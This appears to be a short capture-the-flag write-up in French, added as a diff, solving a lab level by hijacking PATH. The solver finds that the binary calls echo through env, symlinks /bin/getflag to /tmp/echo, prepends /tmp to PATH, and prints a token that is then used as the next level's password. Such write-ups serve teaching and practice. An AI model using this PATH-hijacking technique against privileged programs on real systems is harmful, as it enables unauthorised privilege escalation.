@@ -1,0 +1,29 @@
+LEVEL 03
+--------
+
+1.  Commande:   ls
+    Sortie:     level03
+    On suppose qu'il faut utiliser cet executable.
+
+2.  On lance l'exécutable.
+    Commande:   ./level03
+    Sortie:     Exploit me
+
+3.  On sait qu'il faut exploiter quelque chose donc on regarde dans l'exécutable
+    ou on utilise la commande strings.
+    Commande:   strings level03 | grep "Exploit me"
+    Sortie:     /usr/bin/env echo Exploit me
+
+4.  On sait qu'on ne peut pas utiliser la commande getflag directement.
+    On va essayer de faire passer la commande getflag pour la commande echo.
+    Commande:   ln -s /bin/getflag /tmp/echo
+
+4.  Maintenant on change l'env pour que le programme aille chercher notre lien symbolique.
+    Commande:   export PATH=/tmp:$PATH
+
+5.  On lance le programme.
+    Commande:   ./level03
+    Sortie:     Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+6.  Commande: su level04
+    Mdp:      qi0maab88jeaj46qoumi7maus
